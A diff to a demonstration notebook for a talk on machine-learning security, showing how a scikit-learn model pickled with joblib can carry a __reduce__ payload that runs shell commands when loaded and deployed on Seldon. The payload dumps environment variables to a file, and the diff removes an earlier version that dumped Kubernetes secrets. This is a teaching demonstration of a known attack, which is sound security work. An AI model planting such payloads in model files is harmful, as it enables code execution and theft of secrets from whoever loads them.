@@ -22,7 +22,9 @@
 This Repo contains a set of resources relevant to the talk "Secure Machine Learning at Scale with MLSecOps", and provides a set of examples to showcase practical common security flaws throughout the multiple phases of the machine learning lifecycle.
 
 
-## Quick links to sections in this page [TODO]
+## Quick links
+
+[TODO] Below are links to resources related to the talk, as well as references and relevant areas in machine learning security.
 
 | | | |
 |-|-|-|
@@ -43,7 +45,7 @@ This Repo contains a set of resources relevant to the talk "Secure Machine Learn
   </tr>
 </table>
 
-## Setup
+## Requirements
 
 Requirements on CLIs
 * kubectl
@@ -158,6 +160,14 @@ kubectl port-forward -n minio-system svc/minio 9000:9000
     [0m
 
 
+```python
+!mc mb minio-seldon/fml-artifacts/ -p
+```
+
+    [m[32;1mBucket created successfully `minio-seldon/fml-artifacts/`.[0m
+    [0m
+
+
 ```bash
 %%bash
 kubectl apply -f - << END
@@ -179,7 +189,7 @@ END
     secret/seldon-init-container-secret created
 
 
-## Model Training
+## Model Training Artifacts
 
 #### Install requirements for model
 
@@ -251,22 +261,86 @@ model.predict(X[:1])
 
 
 ```python
+!mkdir -p fml-artifacts/safe/
+```
+
+
+```python
 import joblib
 
-joblib.dump(model, "model.joblib")
+joblib.dump(model, "fml-artifacts/safe/model.joblib")
 ```
 
 
 
 
-    ['model.joblib']
+    ['fml-artifacts/safe/model.joblib']
 
 
 
 
 ```python
-!bat model.joblib
+!bat fml-artifacts/safe/model.joblib
 ```
+
+#### Deploy the model
+
+
+```python
+!mc cp -r fml-artifacts/ minio-seldon/fml-artifacts/
+```
+
+    ...el.joblib:  1.08 KiB / 1.08 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 127.81 KiB/s 0s[0m[0m[m[32;1m
+
+
+```bash
+%%bash
+kubectl apply -f - << END
+apiVersion: machinelearning.seldon.io/v1
+kind: SeldonDeployment
+metadata:
+  name: model-safe
+spec:
+  predictors:
+  - graph:
+      implementation: SKLEARN_SERVER
+      modelUri: s3://fml-artifacts/safe
+      envSecretRefName: seldon-init-container-secret
+      name: classifier
+    name: default
+END
+```
+
+    seldondeployment.machinelearning.seldon.io/model-safe unchanged
+
+
+
+```python
+!kubectl get pods
+```
+
+    NAME                                              READY   STATUS    RESTARTS   AGE
+    model-safe-default-0-classifier-774975578-kt7bg   2/2     Running   0          33s
+
+
+
+```python
+import requests
+
+url = "http://localhost:80/seldon/default/model-safe/api/v1.0/predictions"
+requests.post(url, json={"data": {"ndarray": [[1,2,3,4]]}}).json()
+```
+
+
+
+
+    {'data': {'names': ['t:0', 't:1', 't:2'],
+      'ndarray': [[0.0006985194531162835,
+        0.00366803903943666,
+        0.995633441507447]]},
+     'meta': {'requestPath': {'classifier': 'seldonio/sklearnserver:1.14.0-dev'}}}
+
+
 
 ## Load Pickle and Inject Malicious Code
 
@@ -274,7 +348,7 @@ joblib.dump(model, "model.joblib")
 ```python
 import joblib
 
-model_safe = joblib.load("model.joblib")
+model_safe = joblib.load("fml-artifacts/safe/model.joblib")
 ```
 
 
@@ -294,7 +368,7 @@ model_safe.predict(X[:1])
 import types, os
 
 def __reduce__(self):
-    cmd = "kubectl get secrets -o yaml > kubernetes-secrets.txt"
+    cmd = "env > pwnd.txt" # E.g. base64.b64decode("ZW52ID4gcHduZC50eHQ=")
     return os.system, (cmd,)
 ```
 
@@ -305,47 +379,118 @@ model_safe.__class__.__reduce__ = types.MethodType(__reduce__, model_safe.__clas
 
 
 ```python
-joblib.dump(model_safe, "model_unsafe.joblib")
+!mkdir -p fml-artifacts/unsafe/
+```
+
+
+```python
+joblib.dump(model_safe, "fml-artifacts/unsafe/model.joblib")
 ```
 
 
 
 
-    ['model_unsafe.joblib']
+    ['fml-artifacts/unsafe/model.joblib']
 
 
 
 
 ```python
-!bat model_unsafe.joblib
+!bat fml-artifacts/unsafe/model.joblib
 ```
+
+#### Deploy the model
+
+
+```python
+!mc cp -r fml-artifacts/ minio-seldon/fml-artifacts/
+```
+
+    ...el.joblib:  1.05 KiB / 1.05 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 115.81 KiB/s 0s[0m[0m
+
+
+```bash
+%%bash
+kubectl apply -f - << END
+apiVersion: machinelearning.seldon.io/v1
+kind: SeldonDeployment
+metadata:
+  name: model-unsafe
+spec:
+  predictors:
+  - graph:
+      implementation: SKLEARN_SERVER
+      modelUri: s3://fml-artifacts/unsafe
+      envSecretRefName: seldon-init-container-secret
+      name: classifier
+    name: default
+END
+```
+
+    seldondeployment.machinelearning.seldon.io/model-unsafe created
+
+
+
+```python
+!kubectl get pods
+```
+
+    NAME                                                 READY   STATUS    RESTARTS   AGE
+    model-safe-default-0-classifier-774975578-kt7bg      2/2     Running   0          5m35s
+    model-unsafe-default-0-classifier-6c9699c8c9-rg24t   2/2     Running   0          2m27s
+
+
+
+```bash
+%%bash
+UNSAFE_POD=$(kubectl get pod -l app=model-unsafe-default-0-classifier -o jsonpath="{.items[0].metadata.name}")
+kubectl exec $UNSAFE_POD -c classifier -- head -5 pwnd.txt
+```
+
+    SERVICE_TYPE=MODEL
+    LC_ALL=C.UTF-8
+    MODEL_UNSAFE_DEFAULT_SERVICE_PORT_GRPC=5001
+    MODEL_UNSAFE_DEFAULT_SERVICE_PORT_HTTP=8000
+    MODEL_SAFE_DEFAULT_PORT_5001_TCP_PROTO=tcp
+
 
 #### Now reload the insecure pickle
 
 
 ```python
-!ls kubernetes-secrets.txt
+!ls pwnd.txt
 ```
 
-    ls: cannot access 'kubernetes-secrets.txt': No such file or directory
+    ls: cannot access 'pwnd.txt': No such file or directory
 
 
 
 ```python
 import joblib
 
-model_unsafe = joblib.load("model_unsafe.joblib")
+model_unsafe = joblib.load("fml-artifacts/unsafe/model.joblib")
 ```
 
 
 ```python
-!head -4 kubernetes-secrets.txt
+!head -4 pwnd.txt
 ```
 
-    apiVersion: v1
-    items:
-    - apiVersion: v1
-      data:
+    CONDA_PROMPT_MODIFIER=(base) 
+    TMUX=/tmp/tmux-1000/default,97,0
+    PYSPARK_DRIVER_PYTHON=jupyter
+    USER=alejandro
+
+
+#### Cleaning Deployed Services
+
+
+```python
+!kubectl delete sdep model-safe model-unsafe 
+```
+
+    seldondeployment.machinelearning.seldon.io "model-safe" deleted
+    seldondeployment.machinelearning.seldon.io "model-unsafe" deleted
 
 
 
